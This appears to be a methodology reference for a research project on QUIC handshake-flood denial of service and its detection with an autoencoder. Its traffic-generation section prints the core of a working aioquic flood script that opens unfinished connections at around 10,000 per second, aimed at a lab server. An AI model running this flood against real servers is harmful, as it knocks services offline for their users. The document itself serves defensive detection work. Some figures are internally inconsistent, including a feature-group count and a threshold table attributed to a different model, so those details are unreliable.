# Technical Methodology — QUIC Handshake Degradation

**Purpose:** Explain exactly how the QUIC protocol works, how each script generates traffic, and how features are derived. This is the implementation reference.

---

## Table of Contents

1. [How QUIC Protocol Works](#1-how-quic-protocol-works)
2. [How aioquic Works](#2-how-aioquic-works)
3. [Traffic Generation Scripts](#3-traffic-generation-scripts)
4. [Why High-Rate Flooding Causes Degradation](#4-why-high-rate-flooding-causes-degradation)
5. [Network Setup](#5-network-setup)
6. [Feature Extraction Pipeline](#6-feature-extraction-pipeline)
7. [Statistical Validation Method](#7-statistical-validation-method)
8. [Detection Model Design](#8-detection-model-design)

---

## 1. How QUIC Protocol Works

### What is QUIC?

**QUIC (Quick UDP Internet Connections)** is a modern transport protocol standardized as RFC 9000. It was developed by Google and is now the foundation of HTTP/3.

**Key characteristics:**
- Runs over **UDP**, not TCP
- **TLS 1.3 is integrated** directly into the handshake — encryption is not optional
- Supports **stream multiplexing** — multiple logical streams in one connection, no head-of-line blocking
- **Faster setup:** 1-RTT vs TCP+TLS which requires 3+ round trips
- Connection IDs allow connections to survive IP address changes (e.g., switching from Wi-Fi to LTE)

### The QUIC Handshake in Detail

**Normal benign connection (SF state):**

```
Client (WSL)                                 Server (VM)
     │                                            │
     │──── Initial Packet ───────────────────────►│
     │     Contains: ClientHello (TLS 1.3)        │  Server receives,
     │     Size: ~1248 bytes (padded to 1200+)    │  derives Initial keys,
     │     Encrypted: Initial-level keys          │  begins TLS processing
     │                                            │
     │◄─── Handshake Packet ──────────────────────│
     │     Contains: ServerHello + Certificate    │
     │     Size: ~1872 bytes                      │
     │     Encrypted: Handshake-level keys        │
     │                                            │
     │──── Handshake Packet ───────────────────────►│
     │     Contains: Finished (client auth)       │
     │     Size: ~256 bytes                       │
     │                                            │
     │◄─── 1-RTT Packet ──────────────────────────│
     │     Contains: HANDSHAKE_DONE + ACKs        │
     │     Connection now ready for data          │
     │                                            │
     │────── HTTP/3 Requests ─────────────────────►│
     │◄───── HTTP/3 Responses ─────────────────────│
     │         (multiple streams)                 │
     │                                            │
     │──── CONNECTION_CLOSE ──────────────────────►│
     │                                            │
     Connection closed normally (SF state)
     Total: ~11+ packets each direction
     Duration: 1–10 seconds (session-length)
```

**Why ~1248 bytes for Initial packets?**
- QUIC RFC 9000 requires Initial packets to be at least **1200 bytes** (padded with PADDING frames)
- This prevents amplification attacks: the server cannot send more than it received
- With UDP header (8 bytes) + IP header (20 bytes) + Ethernet overhead: ~1248 bytes total

### QUIC Packet Structure (Initial Packet)

```
┌────────────────────────────────────────┐
│  Long Header                           │
│   Flags (1 byte)                       │
│   QUIC Version (4 bytes)               │
│   Destination Connection ID (8 bytes)  │
│   Source Connection ID (8 bytes)       │
│   Token Length (1 byte)                │
│   Packet Length (2 bytes)              │
│   Packet Number (1–4 bytes)            │
├────────────────────────────────────────┤
│  Encrypted Payload (~1230 bytes)       │
│  ┌────────────────────────────────┐    │
│  │ CRYPTO Frame                   │    │
│  │  TLS ClientHello               │    │
│  │   - Random (32 bytes)          │    │
│  │   - Session ID                 │    │
│  │   - Cipher Suites              │    │
│  │   - ALPN Extension (h3)        │    │
│  │   - Key Share (X25519)         │    │
│  └────────────────────────────────┘    │
│  ┌────────────────────────────────┐    │
│  │ PADDING Frame (to reach 1200b) │    │
│  └────────────────────────────────┘    │
└────────────────────────────────────────┘
```

### Connection States (Zeek `conn_state`)

| State | Meaning | In benign | In malicious |
|-------|---------|-----------|--------------|
| **SF** | Normal establishment and termination | ~100% | 40.3% |
| **S0** | Connection attempt seen, no reply | ~0% | 59.7% |
| S1 | Connection established, not terminated | rare | rare |
| RSTO | Reset by originator | rare | rare |
| REJ | Connection rejected | none | none |

---

## 2. How aioquic Works

**aioquic** is a pure-Python implementation of QUIC and HTTP/3 (RFC 9000, RFC 9114). It handles all protocol complexity: packet framing, TLS 1.3 integration, flow control, congestion control, and stream multiplexing.

### Library Structure

```
aioquic/
├── quic/
│   ├── connection.py      # Core QUIC connection state machine
│   ├── packet.py          # Packet serialization / deserialization
│   ├── crypto.py          # TLS 1.3 key derivation + AEAD
│   ├── recovery.py        # Loss detection and retransmission
│   └── congestion.py      # Congestion control (NewReno / CUBIC)
├── h3/
│   └── connection.py      # HTTP/3 layer (QPACK, stream mapping)
└── asyncio/
    ├── client.py          # High-level async client API
    └── server.py          # High-level async server API
```

### What happens when you call `connect()`

```python
async with connect(server_ip, port, configuration=config, wait_connected=False):
    await asyncio.sleep(0.001)
```

**Internal steps:**

1. **`QuicConnection` created** — generates random Connection IDs (source and destination)
2. **Initial keys derived** — from Connection ID using HKDF (this is deterministic per RFC 9001)
3. **ClientHello assembled** — TLS 1.3 handshake message with cipher suites, key share
4. **CRYPTO frame built** — wraps the ClientHello
5. **Initial packet serialized** — Long Header + encrypted payload + PADDING to 1200 bytes
6. **UDP datagram sent** — `transport.sendto(packet, (server_ip, port))`
7. **`wait_connected=False`** means the client returns immediately without waiting for `ServerHello`

The server receives the datagram and begins:
1. Parsing the Long Header, extracting Connection IDs
2. Deriving Initial keys (same deterministic process)
3. Decrypting and parsing the CRYPTO frame
4. Generating `ServerHello`, certificate, and Handshake keys
5. Sending the Handshake packet back

**Key difference between benign and malicious use:**

| Parameter | Benign (`quic_traffic_generator.py`) | Malicious (`quic_dos_realistic.py`) |
|-----------|--------------------------------------|-------------------------------------|
| `wait_connected` | `True` — waits for full handshake | `False` — returns after sending Initial |
| Post-connection | Makes HTTP/3 requests | `asyncio.sleep(0.001)` then exits |
| Session duration | 1–10 seconds | ~1ms |
| Concurrency model | Tasks at 2/second | Tasks at 10,000/second |

---

## 3. Traffic Generation Scripts

### `quic_server.py` — The Target

A minimal QUIC/HTTP3 server built with aioquic. Accepts connections, processes HTTP/3 requests, and sends simple text responses.

**Key configuration:**
- Host: `0.0.0.0` — accepts from any IP
- Port: 4433 (standard QUIC research port)
- Certificate: self-signed RSA, loaded at startup
- ALPN: `h3` (HTTP/3)

**Server behavior under load:**
- **Normal:** Processes each handshake in sequence, ~1ms response time
- **Under 10k/sec attack:** CPU saturated with TLS key derivation; many connections never receive a response → S0; those that do complete have reduced packet exchanges → degraded SF

---

### `quic_traffic_generator.py` — Benign Sessions

Simulates realistic HTTP/3 users browsing a website. Only the **benign mode** was used for dataset generation.

**Core session logic:**

```python
async def benign_quic_session(server_ip, server_port, session_duration):
    configuration = QuicConfiguration(
        is_client=True,
        alpn_protocols=H3_ALPN,
        verify_mode=False
    )

    async with connect(
        server_ip, server_port,
        configuration=configuration,
        create_protocol=HttpClientProtocol,
        wait_connected=True   # ← waits for full handshake
    ) as client:

        num_requests = random.randint(1, 5)
        for i in range(num_requests):
            path = random.choice(["/", "/index.html", "/api/data", "/health", "/status"])
            await client.make_request(path)
            await asyncio.sleep(random.uniform(0.1, 1.0))  # inter-request delay

        remaining = session_duration - random.uniform(0.5, 2.0)
        if remaining > 0:
            await asyncio.sleep(remaining)   # keep connection alive
    # connection closes normally → SF state
```

**Session dispatch loop:**

```python
async def generate_benign_traffic(server_ip, server_port, num_sessions, duration_seconds):
    while time() < end_time and sessions_launched < num_sessions:
        session_duration = random.uniform(1.0, 10.0)
        asyncio.create_task(benign_quic_session(server_ip, server_port, session_duration))
        sessions_launched += 1
        delay = random.expovariate(2.0)   # Poisson process: avg 2 sessions/sec
        await asyncio.sleep(delay)
    await asyncio.sleep(15)  # let all sessions complete
```

**Resulting flow characteristics:**
- conn_state: SF (complete)
- orig_pkts: ~13 (forward)
- resp_pkts: ~11 (reverse)
- ROUNDTRIPS: ~11 (min of forward/reverse)
- Duration: 1–10 seconds
- ASYMMETRY: ~0.10 (near-symmetric)

---

### `quic_dos_realistic.py` — Malicious Flooding

Sends valid QUIC Initial packets at high rate without waiting for handshake completion. The server receives legitimate connection requests but cannot service them all.

**Core attack logic:**

```python
async def flood_attack(server_ip, server_port):
    configuration = QuicConfiguration(
        is_client=True,
        alpn_protocols=H3_ALPN,
        verify_mode=False
    )
    try:
        async with connect(
            server_ip, server_port,
            configuration=configuration,
            wait_connected=False   # ← does NOT wait for handshake
        ):
            await asyncio.sleep(0.001)   # 1ms — then context exits
    except Exception:
        pass  # silent — expected at high rates
```

**Attack dispatch loop:**

```python
async def generate_dos_traffic(server_ip, server_port, num_attacks, attack_rate, duration_seconds):
    while time() < end_time and attacks_launched < num_attacks:
        asyncio.create_task(flood_attack(server_ip, server_port))  # fire-and-forget
        attacks_launched += 1
        delay = random.expovariate(attack_rate)   # exponential inter-arrival
        await asyncio.sleep(delay)
    await asyncio.sleep(5)  # let lingering connections settle
```

**Why `asyncio.create_task` (fire-and-forget)?**

`create_task` launches the coroutine concurrently without awaiting it. The dispatch loop moves on immediately, creating the next attack task after only the inter-arrival delay. At 10,000/sec, this means ~100µs between task launches. Thousands of `flood_attack` coroutines are running concurrently in the asyncio event loop — each independently sending an Initial packet and waiting 1ms.

**Why exponential inter-arrival (`random.expovariate`)?**

Exponential inter-arrival times model a Poisson process — the standard model for network connection arrivals. This makes the attack traffic statistically realistic rather than perfectly periodic.

**Resulting flow characteristics:**
- conn_state: S0 (~60%) or degraded SF (~40%)
- orig_pkts S0: ~2 (just Initial + possibly retry)
- resp_pkts S0: 0 (no server response)
- orig_pkts SF: ~3 (Initial + Handshake Finished)
- resp_pkts SF: ~3 (Handshake + DONE)
- Duration S0: ~0.001–0.01s
- Duration SF: ~4–14s (server queuing delay)
- ASYMMETRY S0: 1.0 (perfect — zero reverse packets)

---

## 4. Why High-Rate Flooding Causes Degradation

### The Bottleneck: TLS 1.3 Key Derivation

Every QUIC connection requires the server to:
1. Parse the Initial packet and extract the Connection ID
2. Derive Initial encryption keys using HKDF (keyed hash function)
3. Decrypt the CRYPTO frame and parse the ClientHello
4. Generate ephemeral key pair (X25519 ECDH)
5. Derive Handshake keys
6. Serialize ServerHello + certificate chain
7. Encrypt and send the Handshake packet

Steps 2–6 are **cryptographic operations** — CPU-bound work that cannot be parallelized per-connection. At 10,000 connection attempts per second, the server processes ~10,000 key derivations/sec, saturating CPU.

### The Degradation Cascade

```
Attack rate: 10,000 Initial packets/sec
                │
                ▼
Server CPU: saturated with key derivation
                │
        ┌───────┴────────┐
        │                │
   Fast responses    Slow responses
   (lucky timing)    (queue backup)
        │                │
      SF state         S0 state
   (degraded)      (no response)
   ~40% of flows    ~60% of flows
        │
        ▼
Fewer roundtrip exchanges
Shorter packet count
Longer wall-clock duration (queuing delay)
→ Statistically distinguishable from benign SF
```

### Why S0 and Degraded SF Are Both Labeled Malicious

S0 flows: obvious — server never responded. Zero reverse packets.

Degraded SF flows: the server did respond, but:
- It processed the handshake under severe CPU load
- The connection consumed TLS resources that would have served legitimate users
- The resulting flow statistics (3 packets vs 13 normally; 2.56 roundtrips vs 11 normally) are statistically far from benign SF

Both contribute to the attack's impact. Both carry detection signal.

---

## 5. Network Setup

### Why Separate Machines Are Required

```
Localhost testing (same machine):
─────────────────────────────────
Client → loopback → Server
RTT: < 0.1ms

At 0.1ms RTT:
- Client sends Initial at t=0
- Server responds at t=0.5ms
- Client's 1ms timeout fires at t=1ms
- Server response arrives at t=0.6ms → before timeout
- Result: connection completes → SF state
- Attack signature: only ~27% S0 ❌

VM bridged network:
───────────────────
Client (WSL) → physical NIC → switch → VM NIC → Server
RTT: 1–5ms

At 3ms RTT:
- Client sends Initial at t=0
- Server receives at t=1.5ms, begins processing
- Client's 1ms timeout fires at t=1ms → client exits
- Server response arrives at client at t=3ms → client gone
- Under load, server even slower → S0 state
- Attack signature: 53–60% S0 ✅
```

### Setup Steps

**1. VirtualBox configuration:**
- Adapter type: Bridged Adapter (not NAT)
- Promiscuous mode: Allow All
- This gives the VM its own IP on the local network

**2. Verify VM IP:**
```bash
# On VM
ip addr show | grep inet
# → inet 192.168.1.147/24
```

**3. Verify connectivity and latency:**
```bash
# From WSL
ping 192.168.1.147
# PING 192.168.1.147: Reply time=1.2ms, 2.1ms, 1.8ms ✓
```

**4. Start capture on VM:**
```bash
sudo tcpdump -i any udp port 4433 -w capture.pcap
```

**5. Run server on VM:**
```bash
python3 quic_server.py --host 0.0.0.0 --port 4433 \
  --certificate cert.pem --private-key key.pem
```

---

## 6. Feature Extraction Pipeline

### Step 1: Packet Capture (tcpdump)

```bash
sudo tcpdump -i any udp port 4433 -w traffic.pcap
```

Captures all UDP traffic on port 4433 with microsecond timestamps. Output is a PCAP file (binary format, standard across all network analysis tools).

### Step 2: Flow Extraction (Zeek)

```bash
zeek -C -r traffic.pcap
```

Zeek reads the PCAP packet by packet, groups them into flows by (src_ip, src_port, dst_ip, dst_port, proto) 5-tuple, and outputs `conn.log` — one line per flow.

**conn.log fields used:**

```
ts       uid   id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto
duration orig_bytes resp_bytes conn_state missed_bytes
history  orig_pkts  orig_ip_bytes  resp_pkts  resp_ip_bytes
```

Key fields:
- `orig_pkts` / `resp_pkts` — forward and reverse packet counts
- `orig_bytes` / `resp_bytes` — forward and reverse byte counts
- `duration` — flow duration in seconds
- `conn_state` — Zeek's connection state string (SF, S0, etc.)

### Step 3: Feature Calculation (`extract_features.py`)

The script reads `conn.log`, computes derived features, and outputs `flows.csv`.

**Parsing:**
```python
df = pd.read_csv(filepath, sep='\t', comment='#', names=columns,
                 na_values=['-', '(empty)'], low_memory=False)
# '-' in Zeek means null — converted to NaN then filled with 0
```

**Basic features:**
```python
features['PACKETS_FWD']   = df['orig_pkts']
features['PACKETS_REV']   = df['resp_pkts']
features['PACKETS_TOTAL'] = df['orig_pkts'] + df['resp_pkts']
features['BYTES_FWD']     = df['orig_bytes']
features['BYTES_REV']     = df['resp_bytes']
features['BYTES_TOTAL']   = df['orig_bytes'] + df['resp_bytes']
features['DURATION']      = df['duration'].replace(0, 0.001)  # floor at 1ms
```

**Rate features:**
```python
features['PPS_FWD'] = features['PACKETS_FWD'] / features['DURATION']
features['PPS_REV'] = features['PACKETS_REV'] / features['DURATION']
features['BPS_FWD'] = features['BYTES_FWD']   / features['DURATION']
features['BPS_REV'] = features['BYTES_REV']   / features['DURATION']
```

**Ratio and asymmetry features:**
```python
eps = 1e-6  # prevent division by zero

features['FWD_BWD_PKT_RATIO']  = features['PACKETS_FWD'] / (features['PACKETS_REV'] + eps)
features['FWD_BWD_BYTE_RATIO'] = features['BYTES_FWD']   / (features['BYTES_REV']   + eps)

# Normalized asymmetry [0, 1]:  0 = perfectly symmetric, 1 = completely one-directional
total = features['PACKETS_TOTAL']
features['ASYMMETRY'] = np.where(
    total > 0,
    np.abs(features['PACKETS_FWD'] - features['PACKETS_REV']) / total,
    0
)
```

**Bidirectional exchange approximation:**
```python
# A full roundtrip requires at least one packet in each direction.
# min(FWD, REV) counts how many such pairs exist.
features['BIDIRECTIONAL_PAIRS'] = np.minimum(
    features['PACKETS_FWD'], features['PACKETS_REV']
)
features['ROUNDTRIPS_PER_SEC'] = features['BIDIRECTIONAL_PAIRS'] / features['DURATION']
```

For S0 flows: `PACKETS_REV = 0` → `BIDIRECTIONAL_PAIRS = 0` → `ROUNDTRIPS_PER_SEC = 0`.  
For benign SF flows: ~11 pairs, reflecting the full QUIC handshake + HTTP/3 exchanges.  
For degraded malicious SF: ~2–3 pairs (handshake only, barely completed).

**Packet size and timing:**
```python
features['MEAN_PKT_SIZE_FWD'] = features['BYTES_FWD'] / (features['PACKETS_FWD'] + eps)
features['MEAN_PKT_SIZE_REV'] = features['BYTES_REV'] / (features['PACKETS_REV'] + eps)
features['TIME_PER_PKT_FWD']  = features['DURATION']  / (features['PACKETS_FWD'] + eps)
```

**State features (analysis only, excluded from training):**
```python
features['IS_COMPLETE']   = (conn_state == 'SF').astype(int)
features['IS_INCOMPLETE'] = conn_state.isin(['S0', 'S1']).astype(int)
features['IS_RESET']      = conn_state.isin(['RSTO', 'RSTR', 'RSTOS0']).astype(int)
features['IS_REJECTED']   = (conn_state == 'REJ').astype(int)
```

**Post-processing:**
```python
features = features.replace([np.inf, -np.inf], 0)  # clamp any remaining inf
features = features.fillna(0)                        # fill any remaining NaN
```

---

## 7. Statistical Validation Method

`statistical_analysis.py` computes two statistics for each feature across comparison groups:

**Welch's t-test** (not Student's t-test) — used because:
- Groups have very different sizes (159,420 benign vs 14,375 malicious)
- Groups have different variances
- Welch's variant does not assume equal variance

```python
t_stat, p_value = scipy.stats.ttest_ind(x, y, equal_var=False)
```

**Cohen's d** — effect size measure:
```python
pooled_std = sqrt(((n1-1)*var1 + (n2-1)*var2) / (n1+n2-2))
d = (mean1 - mean2) / pooled_std
```

Effect size interpretation:
- |d| < 0.2 → negligible
- 0.2 ≤ |d| < 0.5 → small
- 0.5 ≤ |d| < 0.8 → medium
- |d| ≥ 0.8 → **large**

Three comparison groups are analyzed:
1. Benign (All) vs Malicious (All) — overall separation
2. Benign SF vs Malicious SF — validates labeling of degraded completed flows
3. Benign SF vs Malicious S0 — validates separation for incomplete flows

---

## 8. Detection Model (`DOS_Detection.ipynb`)

### Overview

The full ML pipeline runs in a Keras/TensorFlow notebook (Google Colab) and consists of four stages: preprocessing, autoencoder training, threshold selection, and evaluation. Everything is fit only on benign training data — the malicious set is never seen until evaluation.

---

### 8.1 Preprocessing

**Input:** `normal_flows.csv` (159,420 rows, 24 columns) and `malicious_flows.csv` (14,375 rows, 24 columns).

**Step 1 — Drop non-feature columns:**
```python
DROP_COLS = ["LABEL", "IS_COMPLETE", "IS_INCOMPLETE", "IS_RESET", "IS_REJECTED"]
X_benign    = benign.drop(columns=DROP_COLS)    # → 19 features
X_malicious = malicious.drop(columns=DROP_COLS) # → 19 features
```

State features are dropped to prevent label leakage. The autoencoder must learn from flow statistics only, not from whether the handshake completed.

**Step 2 — Log transform (`log1p`) on heavy-tailed features:**
```python
HEAVY_TAIL = [
    "PPS_FWD", "PPS_REV", "BPS_FWD", "BPS_REV",
    "FWD_BWD_PKT_RATIO", "FWD_BWD_BYTE_RATIO",
    "BYTES_TOTAL", "BYTES_FWD", "BYTES_REV"
]
for col in HEAVY_TAIL:
    X_benign[col]    = np.log1p(X_benign[col])
    X_malicious[col] = np.log1p(X_malicious[col])
```

Why: S0 flows have extreme values (e.g., mean PPI = 414 pkts/sec vs benign mean of 3 pkts/sec). Raw values would make the autoencoder's MSE loss dominated by scale rather than pattern. `log1p` compresses the range while preserving ordering and handling zeros cleanly (log1p(0) = 0).

**Step 3 — Variance filtering:**
```python
selector = VarianceThreshold(threshold=1e-6)
selector.fit(X_benign)
X_benign    = X_benign.loc[:, selector.get_support()]
X_malicious = X_malicious[X_benign.columns]
# Result: 19 features → 19 features (none dropped)
```

**Step 4 — Correlation filtering:**
```python
corr    = X_benign.corr().abs()
upper   = corr.where(np.triu(np.ones(corr.shape), k=1).astype(bool))
to_drop = [col for col in upper.columns if any(upper[col] > 0.95)]
# Dropped: PACKETS_REV, PACKETS_TOTAL, BYTES_TOTAL, PPS_REV, BPS_REV, BIDIRECTIONAL_PAIRS
# → 13 final features
```

These six features are each correlated > 0.95 with a retained counterpart (e.g., `PACKETS_TOTAL` is nearly identical to `PACKETS_FWD` once the dataset is dominated by S0 flows with zero reverse packets). Removing them reduces noise and training instability without losing information.

**Final 13 features, grouped as used in ablation:**

| Group | Features | Count |
|-------|----------|-------|
| counts | PACKETS_FWD, BYTES_FWD, BYTES_REV | 3 |
| rates | PPS_FWD, BPS_FWD | 2 |
| ratios | FWD_BWD_PKT_RATIO, FWD_BWD_BYTE_RATIO, ASYMMETRY, MEAN_PKT_SIZE_FWD, MEAN_PKT_SIZE_REV | 4 (approx — by notebook grouping logic) |
| bidirectional | ROUNDTRIPS_PER_SEC | 1 |
| timing | TIME_PER_PKT_FWD, DURATION | 2 |
| **Total** | | **13** |

**Step 5 — Train/val/test split and scaling:**
```python
X_train, X_temp       = train_test_split(X_benign, test_size=0.4, random_state=42)
X_val, X_test_benign  = train_test_split(X_temp,   test_size=0.5, random_state=42)
# → 60% train / 20% val / 20% test_benign — all benign
# Malicious held out entirely until evaluation

scaler = RobustScaler()                               # median/IQR — robust to extreme values
X_train_scaled        = scaler.fit_transform(X_train) # fit ONLY on benign training set
X_val_scaled          = scaler.transform(X_val)
X_test_benign_scaled  = scaler.transform(X_test_benign)
X_mal_scaled          = scaler.transform(X_malicious) # scaled but never trained on
```

RobustScaler uses median and interquartile range rather than mean and standard deviation — making normalization parameters robust to the extreme values that would otherwise skew StandardScaler.

---

### 8.2 Autoencoder Architecture

```python
def build_autoencoder(input_dim):           # input_dim = 13
    bottleneck_dim = max(4, input_dim // 4) # = max(4, 3) = 4

    inputs     = layers.Input(shape=(input_dim,))
    x          = layers.Dense(128, activation="relu")(inputs)
    x          = layers.Dense(64,  activation="relu")(x)
    bottleneck = layers.Dense(bottleneck_dim, activation="relu")(x)
    x          = layers.Dense(64,  activation="relu")(bottleneck)
    x          = layers.Dense(128, activation="relu")(x)
    outputs    = layers.Dense(input_dim, activation="linear")(x)
    return models.Model(inputs, outputs)
```

```
Input (13)
    │
Dense(128, relu)   ← encoder
    │
Dense(64, relu)
    │
Dense(4, relu)     ← bottleneck (3:1 compression)
    │
Dense(64, relu)    ← decoder
    │
Dense(128, relu)
    │
Dense(13, linear)  ← reconstruction
    │
MSE(input, reconstruction) per flow
```

The linear output activation allows reconstructed values to span any real number, appropriate for scaled (not [0,1]-bounded) inputs.

---

### 8.3 Training

```python
model.compile(optimizer=tf.keras.optimizers.Adam(1e-3), loss="mse")

early_stop = callbacks.EarlyStopping(
    monitor="val_loss", patience=5, restore_best_weights=True
)

model.fit(
    X_train_scaled, X_train_scaled,           # input = target (reconstruction task)
    validation_data=(X_val_scaled, X_val_scaled),
    epochs=100,
    batch_size=512,
    shuffle=True,
    callbacks=[early_stop],
    verbose=0
)
```

The model receives the same benign data as both input and reconstruction target. It never sees malicious flows. EarlyStopping with `restore_best_weights=True` ensures the model returned is the one with the lowest validation loss, not the last epoch.

---

### 8.4 Reconstruction Error and Threshold

```python
def reconstruction_error(model, X):
    X_hat = model.predict(X, verbose=0)
    return np.mean((X - X_hat)**2, axis=1)  # per-flow MSE

err_benign = reconstruction_error(model, X_test_benign_scaled)
err_mal    = reconstruction_error(model, X_mal_scaled)

threshold  = np.percentile(err_benign, 95)  # operating point
```

At the 95th percentile threshold — the autoencoder correctly flags all malicious flows while accepting 95% of benign flows.

Malicious SF flows evaluated separately to confirm that degraded-but-completed handshakes are detected:
```python
mal_sf_mask      = malicious["IS_COMPLETE"] == 1   # 5,793 flows
X_mal_sf         = X_malicious[mal_sf_mask]
err_mal_sf       = reconstruction_error(model, scaler.transform(X_mal_sf))
mal_sf_detection = np.mean(err_mal_sf > threshold)  # = 1.0
```

---

### 8.5 Results

**Autoencoder:**

| Metric | Value |
|--------|-------|
| AUC-ROC | **0.9998** |
| Malicious SF detection rate (at 95th pct threshold) | **100%** |

**Threshold sensitivity (Isolation Forest scores used here for comparison grid):**

| Threshold percentile | FPR | TPR |
|---------------------|-----|-----|
| 90th | 10.0% | 100% |
| **95th** ← operating point | **5.0%** | **100%** |
| 97th | 3.0% | 100% |
| 99th | 1.0% | 96.3% |

The model achieves 100% TPR down to the 97th percentile, confirming malicious flows sit well above — not just marginally above — the benign reconstruction error distribution.

**Baseline comparison:**

| Model | AUC-ROC |
|-------|---------|
| **Autoencoder** | **0.9998** |
| Isolation Forest (`n_estimators=200`, `contamination=0.05`) | 0.9971 |

---

### 8.6 Ablation Study

Each feature group removed in turn; `train_and_evaluate()` re-run from scratch:

| Removed group | AUC | Mal SF Detection |
|---------------|-----|-----------------|
| None (full model) | 0.9998 | 100% |
| counts | 0.9997 | 100% |
| rates | 0.9996 | 100% |
| ratios | 0.9997 | 100% |
| bidirectional | 0.9999 | 100% |
| timing | 0.9996 | 100% |

All ablations remain above AUC 0.9995. The degradation signal is distributed across all feature categories — no single group is uniquely critical or uniquely redundant. This means an attacker cannot evade detection by manipulating one dimension of their traffic profile.

---

### 8.7 Why This Approach vs Supervised

| Property | Autoencoder (this work) | Supervised Classifier |
|----------|------------------------|-----------------------|
| Requires labeled attack data | ❌ No | ✅ Yes |
| Generalizes to new attack variants | ✅ Yes (detects deviation from normal) | ❌ Limited to seen attack types |
| Interpretable threshold | ✅ Percentile of benign error | ❌ Class probability |
| Deployment assumption | Benign traffic samples only | Large labeled dataset of attacks needed |
